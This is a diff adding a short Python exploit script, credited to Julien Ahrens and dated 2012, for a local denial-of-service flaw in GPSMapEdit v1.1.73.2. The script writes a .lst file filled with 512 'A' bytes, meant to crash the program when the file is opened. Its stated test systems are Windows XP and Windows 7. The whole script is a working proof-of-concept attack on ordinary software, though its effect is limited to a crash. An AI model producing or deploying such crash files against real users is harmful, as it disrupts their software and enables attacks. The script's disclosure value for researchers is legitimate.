@@ -1,0 +1,18 @@
+#!/usr/bin/python
+ 
+# Exploit Title: GPSMapEdit v1.1.73.2 (.lst) Local Denial of Service Vulnerability
+# Version:       1.1.73.2
+# Date:          2012-01-08
+# Author:        Julien Ahrens
+# Homepage:      www.inshell.net
+# Software Link: http://www.geopainting.com
+# Tested on:     Windows XP SP3 Professional German / Windows 7 Professional 64bit German
+ 
+file="GPSMapEdit_crash.lst"
+junk="\x41"*512
+
+print "[*] Creating crash file...\n";
+writeFile = open (file, "w")
+writeFile.write(junk)
+writeFile.close()
+print "[*] File successfully created!\n\n";
